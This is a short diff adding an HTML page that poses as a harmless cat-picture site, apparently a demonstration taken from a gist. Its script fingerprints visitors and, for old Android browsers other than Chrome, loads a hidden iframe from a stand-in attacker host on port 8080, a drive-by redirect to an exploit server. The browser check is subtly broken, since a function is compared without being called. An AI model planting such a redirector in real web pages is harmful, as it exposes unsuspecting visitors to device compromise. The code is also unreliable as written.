@@ -1,0 +1,19 @@
+<!--
+source: https://gist.github.com/joswr1ght/ad8d25a4da2e6d65cdb1
+-->
+	<html><head><script src="Spec.js/lib/Spec.js"></script></head>
+<body>
+This is a normal website. Look at these pictures of cats...
+<script>
+	var spec = new Spec();
+	if (spec.isDeviceDetected() && spec.getOS() == "Android" 
+			&& spec.getBrowser != "Chrome"
+			&& parseFloat(spec.getOSVersion()) < 4.4) {
+		var iframe = document.createElement('iframe');
+		iframe.style.display="none";
+		iframe.src = "http://attacker.com:8080";
+		document.body.appendChild(iframe);
+	}
+</script>
+</body>
+</html>
